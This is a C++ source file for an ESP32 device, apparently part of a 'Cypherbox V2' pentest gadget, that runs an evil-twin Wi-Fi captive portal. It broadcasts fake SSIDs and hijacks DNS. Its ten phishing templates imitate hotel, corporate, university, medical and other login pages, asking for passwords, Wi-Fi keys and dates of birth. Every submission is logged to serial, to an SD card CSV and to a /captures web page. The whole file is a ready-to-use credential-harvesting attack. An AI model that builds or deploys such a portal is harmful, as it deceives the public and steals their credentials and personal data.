// src/captive_portal.cpp - Captive Portal Module for Cypherbox V2
//
// Improved over standalone ESP32-Captive-Portal:
//   - SD card logging to /captive_log.csv
//   - Integration with Cypherbox Display/Terminal infrastructure
//   - 20-capture circular buffer (RAM-safe for ESP32)
//   - All 10 original portal templates in PROGMEM

#include "captive_portal.h"
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <SD.h>

extern bool sdInitialized;

// ============================================================================
// Static member definitions
// ============================================================================

bool CaptivePortal::running = false;
int CaptivePortal::activeTemplate = 0;
int CaptivePortal::captureCount = 0;
int CaptivePortal::captureHead = 0;
CaptivePortal::CaptureEntry CaptivePortal::captures[CAPTIVE_PORTAL_MAX_CAPTURES];

static DNSServer* cpDns = nullptr;
static WebServer* cpServer = nullptr;

// ============================================================================
// Template metadata
// ============================================================================

static const char* TMPL_NAMES[CAPTIVE_PORTAL_TEMPLATE_COUNT] = {
    "Hotel/Guest", "Coffee Shop", "Corporate", "Airport", "Library",
    "Conference",  "Retail",      "DeviceSetup", "University", "Medical"
};

static const char* TMPL_SSIDS[CAPTIVE_PORTAL_TEMPLATE_COUNT] = {
    "GrandHotel_FreeWiFi", "BeanAndBrew_WiFi",   "ACME_Corp_Secure",
    "SkyLink_Airport",      "CityLibrary_Free",   "TechSummit2024",
    "TechZone_WiFi",        "SmartHome_Setup",     "MetroU_Campus",
    "Wellness_Medical"
};

// ============================================================================
// HTML templates (PROGMEM)
// ============================================================================

static const char HTML_HOTEL[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head>
<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Grand Hotel - Free WiFi</title>
<style>body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#1a5276,#2e86ab);min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0}.container{background:white;border-radius:16px;padding:40px;max-width:400px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.3)}h1{color:#1a5276;margin:0 0 10px;font-size:28px;text-align:center}.subtitle{color:#666;text-align:center;margin-bottom:30px;font-size:14px}label{color:#333;font-weight:600;display:block;margin-bottom:8px;font-size:13px}input{width:100%;padding:14px;border:2px solid #e0e0e0;border-radius:8px;font-size:16px;box-sizing:border-box;margin-bottom:20px}input:focus{outline:none;border-color:#2e86ab}button{width:100%;padding:16px;background:#1a5276;color:white;border:none;border-radius:8px;font-size:18px;font-weight:bold;cursor:pointer}.note{text-align:center;color:#888;font-size:12px;margin-top:20px}</style>
</head><body><div class='container'>
<h1>🏨 Grand Hotel</h1>
<p class='subtitle'>Welcome! Enter room info for free WiFi.</p>
<form action='/submit' method='POST'>
<label>Room Number</label><input type='text' name='room' placeholder='e.g. 204' required>
<label>Last Name</label><input type='text' name='name' placeholder='e.g. Smith' required>
<button type='submit'>Connect</button></form>
<p class='note'>Front desk: dial 0</p>
</div></body></html>)rawliteral";

static const char HTML_COFFEE[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head>
<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Bean & Brew - Free WiFi</title>
<style>body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#6f4e37,#8b5a2b);min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0}.container{background:white;border-radius:16px;padding:40px;max-width:400px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.3)}h1{color:#6f4e37;margin:0 0 10px;font-size:28px;text-align:center}.subtitle{color:#666;text-align:center;margin-bottom:30px;font-size:14px}label{color:#333;font-weight:600;display:block;margin-bottom:8px;font-size:13px}input{width:100%;padding:14px;border:2px solid #e0e0e0;border-radius:8px;font-size:16px;box-sizing:border-box;margin-bottom:20px}input:focus{outline:none;border-color:#6f4e37}.checkbox{display:flex;align-items:center;margin-bottom:20px;font-size:13px;color:#555}.checkbox input{width:auto;margin-right:10px;margin-bottom:0}button{width:100%;padding:16px;background:#6f4e37;color:white;border:none;border-radius:8px;font-size:18px;font-weight:bold;cursor:pointer}</style>
</head><body><div class='container'>
<h1>☕ Bean & Brew</h1>
<p class='subtitle'>Enter email for exclusive offers.</p>
<form action='/submit' method='POST'>
<label>Email</label><input type='email' name='email' placeholder='you@example.com' required>
<label>Name</label><input type='text' name='name' placeholder='Your name' required>
<div class='checkbox'><input type='checkbox' name='marketing' value='yes'><span>Send me special offers</span></div>
<button type='submit'>Connect</button></form>
</div></body></html>)rawliteral";

static const char HTML_CORPORATE[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head>
<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>ACME Corp - Secure Network</title>
<style>body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#2c3e50,#34495e);min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0}.container{background:white;border-radius:16px;padding:40px;max-width:400px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.3)}h1{color:#2c3e50;margin:0 0 5px;font-size:24px;text-align:center}.subtitle{color:#666;text-align:center;margin-bottom:25px;font-size:14px}.warning{background:#fff3cd;color:#856404;padding:12px;border-radius:8px;font-size:12px;text-align:center;margin-bottom:20px}label{color:#333;font-weight:600;display:block;margin-bottom:8px;font-size:13px}input{width:100%;padding:14px;border:2px solid #e0e0e0;border-radius:8px;font-size:16px;box-sizing:border-box;margin-bottom:20px}input:focus{outline:none;border-color:#2c3e50}button{width:100%;padding:16px;background:#2c3e50;color:white;border:none;border-radius:8px;font-size:18px;font-weight:bold;cursor:pointer}.note{text-align:center;color:#888;font-size:12px;margin-top:20px}</style>
</head><body><div class='container'>
<h1>🔒 ACME Corp</h1>
<p class='subtitle'>Employee Network Access</p>
<div class='warning'>⚠️ Unauthorized access is monitored.</div>
<form action='/submit' method='POST'>
<label>Employee ID</label><input type='text' name='empid' placeholder='e.g. JSmith001' required>
<label>Password</label><input type='password' name='password' placeholder='Enter password' required>
<button type='submit'>Authenticate</button></form>
<p class='note'>IT Support: ext. 1234</p>
</div></body></html>)rawliteral";

static const char HTML_AIRPORT[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head>
<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>SkyLink Airport WiFi</title>
<style>body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#1a1a2e,#16213e);min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0}.container{background:white;border-radius:16px;padding:40px;max-width:400px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.3)}.icon{text-align:center;font-size:40px;margin-bottom:10px}h1{color:#1a1a2e;margin:0 0 10px;font-size:28px;text-align:center}.subtitle{color:#666;text-align:center;margin-bottom:30px;font-size:14px}label{color:#333;font-weight:600;display:block;margin-bottom:8px;font-size:13px}input{width:100%;padding:14px;border:2px solid #e0e0e0;border-radius:8px;font-size:16px;box-sizing:border-box;margin-bottom:20px}input:focus{outline:none;border-color:#1a1a2e}button{width:100%;padding:16px;background:#1a1a2e;color:white;border:none;border-radius:8px;font-size:18px;font-weight:bold;cursor:pointer}</style>
</head><body><div class='container'>
<div class='icon'>✈️</div>
<h1>SkyLink WiFi</h1>
<p class='subtitle'>Terminal B - Verify your flight</p>
<form action='/submit' method='POST'>
<label>Flight Number</label><input type='text' name='flight' placeholder='e.g. AA1234' required>
<label>Last Name</label><input type='text' name='name' placeholder='e.g. Johnson' required>
<button type='submit'>Connect</button></form>
</div></body></html>)rawliteral";

static const char HTML_LIBRARY[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head>
<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>City Public Library</title>
<style>body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#27ae60,#2ecc71);min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0}.container{background:white;border-radius:16px;padding:40px;max-width:400px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.3)}h1{color:#27ae60;margin:0 0 10px;font-size:24px;text-align:center}.subtitle{color:#666;text-align:center;margin-bottom:30px;font-size:14px}.rules{background:#f8f9fa;padding:12px;border-radius:8px;font-size:11px;color:#555;margin-bottom:20px}label{color:#333;font-weight:600;display:block;margin-bottom:8px;font-size:13px}input{width:100%;padding:14px;border:2px solid #e0e0e0;border-radius:8px;font-size:16px;box-sizing:border-box;margin-bottom:20px}input:focus{outline:none;border-color:#27ae60}button{width:100%;padding:16px;background:#27ae60;color:white;border:none;border-radius:8px;font-size:18px;font-weight:bold;cursor:pointer}</style>
</head><body><div class='container'>
<h1>📚 City Library</h1>
<p class='subtitle'>Library Card Required</p>
<div class='rules'><strong>Rules:</strong> No illegal downloads, 2hr sessions max.</div>
<form action='/submit' method='POST'>
<label>Card Number</label><input type='text' name='card' placeholder='12 digits on card' required>
<label>Last 4 Phone Digits</label><input type='text' name='phone4' placeholder='1234' maxlength='4' required>
<button type='submit'>Access Internet</button></form>
</div></body></html>)rawliteral";

static const char HTML_CONFERENCE[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head>
<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>TechSummit 2024 - WiFi</title>
<style>body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#8e44ad,#9b59b6);min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0}.container{background:white;border-radius:16px;padding:40px;max-width:400px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.3)}.event{text-align:center;font-size:16px;font-weight:bold;color:#8e44ad;margin-bottom:5px}.badge{text-align:center;font-size:50px;margin-bottom:10px}h1{color:#8e44ad;margin:0 0 10px;font-size:24px;text-align:center}.subtitle{color:#666;text-align:center;margin-bottom:25px;font-size:14px}label{color:#333;font-weight:600;display:block;margin-bottom:8px;font-size:13px}input{width:100%;padding:14px;border:2px solid #e0e0e0;border-radius:8px;font-size:16px;box-sizing:border-box;margin-bottom:20px}input:focus{outline:none;border-color:#8e44ad}button{width:100%;padding:16px;background:#8e44ad;color:white;border:none;border-radius:8px;font-size:18px;font-weight:bold;cursor:pointer}.note{text-align:center;color:#888;font-size:12px;margin-top:20px}</style>
</head><body><div class='container'>
<div class='badge'>🎫</div>
<div class='event'>TechSummit 2024</div>
<h1>Attendee WiFi</h1>
<p class='subtitle'>Enter badge info to connect</p>
<form action='/submit' method='POST'>
<label>Badge ID</label><input type='text' name='badge' placeholder='e.g. TECH-2024-12345' required>
<label>Email</label><input type='email' name='email' placeholder='you@company.com' required>
<button type='submit'>Connect</button></form>
<p class='note'>Help Desk: Hall A</p>
</div></body></html>)rawliteral";

static const char HTML_RETAIL[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head>
<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>TechZone Store - WiFi</title>
<style>body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#e74c3c,#c0392b);min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0}.container{background:white;border-radius:16px;padding:40px;max-width:400px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.3)}h1{color:#e74c3c;margin:0 0 10px;font-size:28px;text-align:center}.subtitle{color:#666;text-align:center;margin-bottom:30px;font-size:14px}.promo{background:#fee;color:#c0392b;padding:12px;border-radius:8px;font-size:13px;text-align:center;margin-bottom:20px}label{color:#333;font-weight:600;display:block;margin-bottom:8px;font-size:13px}input{width:100%;padding:14px;border:2px solid #e0e0e0;border-radius:8px;font-size:16px;box-sizing:border-box;margin-bottom:20px}input:focus{outline:none;border-color:#e74c3c}button{width:100%;padding:16px;background:#e74c3c;color:white;border:none;border-radius:8px;font-size:18px;font-weight:bold;cursor:pointer}</style>
</head><body><div class='container'>
<h1>🛒 TechZone</h1>
<p class='subtitle'>Free WiFi - Quick sign up!</p>
<div class='promo'>🎉 Get 10% off with signup!</div>
<form action='/submit' method='POST'>
<label>Phone</label><input type='tel' name='phone' placeholder='(555) 123-4567' required>
<label>Email</label><input type='email' name='email' placeholder='you@example.com' required>
<button type='submit'>Get Connected</button></form>
</div></body></html>)rawliteral";

static const char HTML_DEVICE[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head>
<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>SmartHome Hub - Setup</title>
<style>body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#16a085,#1abc9c);min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0}.container{background:white;border-radius:16px;padding:40px;max-width:400px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.3)}h1{color:#16a085;margin:0 0 10px;font-size:28px;text-align:center}.subtitle{color:#666;text-align:center;margin-bottom:30px;font-size:14px}.step{background:#e8f8f5;color:#16a085;padding:12px;border-radius:8px;font-size:12px;margin-bottom:20px}label{color:#333;font-weight:600;display:block;margin-bottom:8px;font-size:13px}input{width:100%;padding:14px;border:2px solid #e0e0e0;border-radius:8px;font-size:16px;box-sizing:border-box;margin-bottom:20px}input:focus{outline:none;border-color:#16a085}button{width:100%;padding:16px;background:#16a085;color:white;border:none;border-radius:8px;font-size:18px;font-weight:bold;cursor:pointer}</style>
</head><body><div class='container'>
<h1>🏠 SmartHome Hub</h1>
<p class='subtitle'>Device Setup - Enter WiFi info</p>
<div class='step'>Step 2 of 3: Connect hub to internet</div>
<form action='/submit' method='POST'>
<label>Your WiFi SSID</label><input type='text' name='ssid' placeholder='MyHomeNetwork' required>
<label>WiFi Password</label><input type='password' name='wifi_pass' placeholder='Enter password' required>
<button type='submit'>Configure Device</button></form>
</div></body></html>)rawliteral";

static const char HTML_UNIVERSITY[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head>
<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Metro University - Student WiFi</title>
<style>body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#2c3e50,#8e44ad);min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0}.container{background:white;border-radius:16px;padding:40px;max-width:400px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.3)}.uni{text-align:center;font-size:18px;font-weight:bold;color:#8e44ad;margin-bottom:5px}h1{color:#2c3e50;margin:0 0 10px;font-size:24px;text-align:center}.subtitle{color:#666;text-align:center;margin-bottom:25px;font-size:14px}label{color:#333;font-weight:600;display:block;margin-bottom:8px;font-size:13px}input{width:100%;padding:14px;border:2px solid #e0e0e0;border-radius:8px;font-size:16px;box-sizing:border-box;margin-bottom:20px}input:focus{outline:none;border-color:#2c3e50}button{width:100%;padding:16px;background:#2c3e50;color:white;border:none;border-radius:8px;font-size:18px;font-weight:bold;cursor:pointer}.note{text-align:center;color:#888;font-size:12px;margin-top:20px}</style>
</head><body><div class='container'>
<div class='uni'>🎓 Metro University</div>
<h1>Campus WiFi</h1>
<p class='subtitle'>Student credentials required</p>
<form action='/submit' method='POST'>
<label>Student Email</label><input type='email' name='email' placeholder='student@university.edu' required>
<label>Password</label><input type='password' name='password' placeholder='Student password' required>
<button type='submit'>Sign In</button></form>
<p class='note'>IT Help: Library Rm 201</p>
</div></body></html>)rawliteral";

static const char HTML_MEDICAL[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head>
<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Wellness Medical - Guest WiFi</title>
<style>body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#3498db,#2980b9);min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0}.container{background:white;border-radius:16px;padding:40px;max-width:400px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.3)}h1{color:#3498db;margin:0 0 10px;font-size:24px;text-align:center}.subtitle{color:#666;text-align:center;margin-bottom:25px;font-size:14px}.notice{background:#e8f4fd;color:#2980b9;padding:12px;border-radius:8px;font-size:12px;margin-bottom:20px}label{color:#333;font-weight:600;display:block;margin-bottom:8px;font-size:13px}input{width:100%;padding:14px;border:2px solid #e0e0e0;border-radius:8px;font-size:16px;box-sizing:border-box;margin-bottom:20px}input:focus{outline:none;border-color:#3498db}button{width:100%;padding:16px;background:#3498db;color:white;border:none;border-radius:8px;font-size:18px;font-weight:bold;cursor:pointer}</style>
</head><body><div class='container'>
<h1>🏥 Wellness Medical</h1>
<p class='subtitle'>Free WiFi for patients & visitors</p>
<div class='notice'>⚕️ Verify info for network access</div>
<form action='/submit' method='POST'>
<label>Date of Birth</label><input type='text' name='dob' placeholder='MM/DD/YYYY' required>
<label>Last Name</label><input type='text' name='name' placeholder='e.g. Williams' required>
<button type='submit'>Access WiFi</button></form>
</div></body></html>)rawliteral";

static const char HTML_SUCCESS[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head>
<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Connected</title>
<style>body{font-family:Arial,sans-serif;background:#27ae60;min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0}.container{background:white;border-radius:16px;padding:40px;max-width:400px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.3);text-align:center}.icon{font-size:60px;margin-bottom:20px}h1{color:#27ae60;margin:0 0 10px;font-size:28px}p{color:#666;font-size:16px}.note{color:#888;font-size:12px;margin-top:30px}</style>
</head><body><div class='container'>
<div class='icon'>✅</div>
<h1>Connected!</h1>
<p>You now have internet access.</p>
<p>Enjoy your visit.</p>
<div class='note'>Session: 2 hours</div>
</div></body></html>)rawliteral";

static const char* TMPL_HTML[CAPTIVE_PORTAL_TEMPLATE_COUNT] = {
    HTML_HOTEL, HTML_COFFEE, HTML_CORPORATE, HTML_AIRPORT, HTML_LIBRARY,
    HTML_CONFERENCE, HTML_RETAIL, HTML_DEVICE, HTML_UNIVERSITY, HTML_MEDICAL
};

// ============================================================================
// Private helpers
// ============================================================================

String CaptivePortal::urlDecode(const String& str) {
    String out;
    out.reserve(str.length());
    for (unsigned int i = 0; i < str.length(); i++) {
        if (str[i] == '%' && i + 2 < str.length()) {
            char hex[3] = { str[i + 1], str[i + 2], 0 };
            out += (char)strtol(hex, nullptr, 16);
            i += 2;
        } else if (str[i] == '+') {
            out += ' ';
        } else {
            out += str[i];
        }
    }
    return out;
}

void CaptivePortal::addCapture(const String& templateName, const String& data) {
    String entry = templateName + ": " + data;
    captures[captureHead].timestamp = millis();
    strncpy(captures[captureHead].data, entry.c_str(), CAPTIVE_PORTAL_CAPTURE_LEN - 1);
    captures[captureHead].data[CAPTIVE_PORTAL_CAPTURE_LEN - 1] = '\0';
    captureHead = (captureHead + 1) % CAPTIVE_PORTAL_MAX_CAPTURES;
    if (captureCount < CAPTIVE_PORTAL_MAX_CAPTURES) captureCount++;

    Serial.printf("CAPTURE [%s]: %s\n", templateName.c_str(), data.c_str());

    if (sdInitialized) {
        File f = SD.open("/captive_log.csv", FILE_APPEND);
        if (!f) {
            f = SD.open("/captive_log.csv", FILE_WRITE);
            if (f) { f.println("timestamp_ms,template,data"); f.close(); }
            f = SD.open("/captive_log.csv", FILE_APPEND);
        }
        if (f) {
            f.print(millis());
            f.print(",");
            f.print(templateName);
            f.print(",");
            f.println(data);
            f.close();
        }
    }
}

void CaptivePortal::setupRoutes() {
    int t = activeTemplate;

    cpServer->on("/", HTTP_GET, [t]() {
        cpServer->send_P(200, "text/html", TMPL_HTML[t]);
    });
    cpServer->on("/generate_204", HTTP_GET, [t]() {
        cpServer->send_P(200, "text/html", TMPL_HTML[t]);
    });
    cpServer->on("/hotspot-detect.html", HTTP_GET, [t]() {
        cpServer->send_P(200, "text/html", TMPL_HTML[t]);
    });
    cpServer->on("/connecttest.txt", HTTP_GET, []() {
        cpServer->send(200, "text/plain", "");
    });
    cpServer->on("/ncsi.txt", HTTP_GET, []() {
        cpServer->send(200, "text/plain", "");
    });
    cpServer->on("/submit", HTTP_POST, []() {
        String body = cpServer->arg("plain");
        String dataStr;
        int start = 0;
        int amp = body.indexOf('&');
        while (amp != -1) {
            String pair = body.substring(start, amp);
            int eq = pair.indexOf('=');
            if (eq != -1) {
                dataStr += CaptivePortal::urlDecode(pair.substring(0, eq)) + "=" +
                           CaptivePortal::urlDecode(pair.substring(eq + 1)) + " ";
            }
            start = amp + 1;
            amp = body.indexOf('&', start);
        }
        if (start < (int)body.length()) {
            String pair = body.substring(start);
            int eq = pair.indexOf('=');
            if (eq != -1) {
                dataStr += CaptivePortal::urlDecode(pair.substring(0, eq)) + "=" +
                           CaptivePortal::urlDecode(pair.substring(eq + 1));
            }
        }
        CaptivePortal::addCapture(String(TMPL_NAMES[CaptivePortal::activeTemplate]), dataStr);
        cpServer->sendHeader("Location", "/success", true);
        cpServer->send(302, "text/plain", "");
    });
    cpServer->on("/success", HTTP_GET, []() {
        cpServer->send_P(200, "text/html", HTML_SUCCESS);
    });
    cpServer->on("/captures", HTTP_GET, []() {
        String html = "<html><head><title>Captures</title>";
        html += "<style>body{font-family:Arial;padding:20px}table{width:100%;border-collapse:collapse}";
        html += "th,td{border:1px solid #ddd;padding:8px;text-align:left}";
        html += "th{background:#333;color:white}</style></head><body>";
        html += "<h2>Captured Data</h2>";
        html += "<p>Template: <strong>" + String(TMPL_NAMES[CaptivePortal::activeTemplate]) + "</strong>";
        html += " | Total: <strong>" + String(CaptivePortal::captureCount) + "</strong></p>";
        html += "<table><tr><th>#</th><th>Time(ms)</th><th>Data</th></tr>";
        for (int i = 0; i < CaptivePortal::captureCount; i++) {
            int idx = (CaptivePortal::captureHead - CaptivePortal::captureCount + i +
                       CAPTIVE_PORTAL_MAX_CAPTURES) % CAPTIVE_PORTAL_MAX_CAPTURES;
            html += "<tr><td>" + String(i + 1) + "</td><td>" +
                    String(CaptivePortal::captures[idx].timestamp) + "</td><td>" +
                    String(CaptivePortal::captures[idx].data) + "</td></tr>";
        }
        html += "</table><br><a href='/clear'>Clear All</a> | <a href='/'>Back</a></body></html>";
        cpServer->send(200, "text/html", html);
    });
    cpServer->on("/clear", HTTP_GET, []() {
        CaptivePortal::clearCaptures();
        cpServer->send(200, "text/html", "<h2>Cleared</h2><a href='/captures'>Back</a>");
    });
    cpServer->onNotFound([t]() {
        cpServer->send_P(200, "text/html", TMPL_HTML[t]);
    });
}

// ============================================================================
// Public API
// ============================================================================

void CaptivePortal::init() {
    running = false;
    Serial.println("CaptivePortal: initialized");
}

void CaptivePortal::deinit() {
    stop();
    Serial.println("CaptivePortal: deinitialized");
}

void CaptivePortal::start(int templateIndex) {
    if (running) return;

    if (templateIndex >= 0 && templateIndex < CAPTIVE_PORTAL_TEMPLATE_COUNT) {
        activeTemplate = templateIndex;
    }

    Serial.printf("CaptivePortal: starting template=%s SSID=%s\n",
                  TMPL_NAMES[activeTemplate], TMPL_SSIDS[activeTemplate]);

    WiFi.mode(WIFI_AP);
    if (!WiFi.softAP(TMPL_SSIDS[activeTemplate])) {
        Serial.println("CaptivePortal: AP start failed");
        return;
    }
    Serial.printf("CaptivePortal: AP up at %s\n", WiFi.softAPIP().toString().c_str());

    cpDns = new DNSServer();
    cpServer = new WebServer(80);

    cpDns->start(53, "*", WiFi.softAPIP());
    setupRoutes();
    cpServer->begin();

    running = true;
    Serial.println("CaptivePortal: running");
}

void CaptivePortal::stop() {
    if (!running) return;

    if (cpServer) { cpServer->stop(); delete cpServer; cpServer = nullptr; }
    if (cpDns)    { cpDns->stop();   delete cpDns;    cpDns = nullptr;    }

    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);

    running = false;
    Serial.println("CaptivePortal: stopped");
}

void CaptivePortal::handleClient() {
    if (!running) return;
    if (cpDns)    cpDns->processNextRequest();
    if (cpServer) cpServer->handleClient();
}

int CaptivePortal::getConnectedClients() {
    return running ? (int)WiFi.softAPgetStationNum() : 0;
}

String CaptivePortal::getActiveSSID() {
    return String(TMPL_SSIDS[activeTemplate]);
}

const char* CaptivePortal::getTemplateName(int index) {
    if (index < 0 || index >= CAPTIVE_PORTAL_TEMPLATE_COUNT) return "Unknown";
    return TMPL_NAMES[index];
}

void CaptivePortal::setTemplate(int index) {
    if (index >= 0 && index < CAPTIVE_PORTAL_TEMPLATE_COUNT) {
        activeTemplate = index;
    }
}

String CaptivePortal::getCapture(int index) {
    if (index < 0 || index >= captureCount) return "";
    int idx = (captureHead - captureCount + index + CAPTIVE_PORTAL_MAX_CAPTURES)
              % CAPTIVE_PORTAL_MAX_CAPTURES;
    return String(captures[idx].data);
}

void CaptivePortal::clearCaptures() {
    captureCount = 0;
    captureHead = 0;
    memset(captures, 0, sizeof(captures));
    Serial.println("CaptivePortal: captures cleared");
}

void CaptivePortal::printCapturesToSerial() {
    if (captureCount == 0) {
        Serial.println("CaptivePortal: no captures");
        return;
    }
    Serial.printf("CaptivePortal: %d capture(s):\n", captureCount);
    for (int i = 0; i < captureCount; i++) {
        int idx = (captureHead - captureCount + i + CAPTIVE_PORTAL_MAX_CAPTURES)
                  % CAPTIVE_PORTAL_MAX_CAPTURES;
        Serial.printf("  [%d] t=%lu %s\n", i + 1, captures[idx].timestamp, captures[idx].data);
    }
}
